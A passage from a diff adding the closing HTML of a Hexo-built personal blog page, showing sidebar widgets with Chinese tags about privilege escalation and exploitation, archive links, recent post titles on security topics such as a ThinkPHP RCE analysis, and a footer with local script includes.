+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 15px;">提权</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 10px;">数据结构</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 20px;">漏洞利用</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/24/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/TP5-RCE%E5%88%86%E6%9E%90/">TP5 RCE分析</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/">vulnstack 红队一</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/08/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">中间件漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
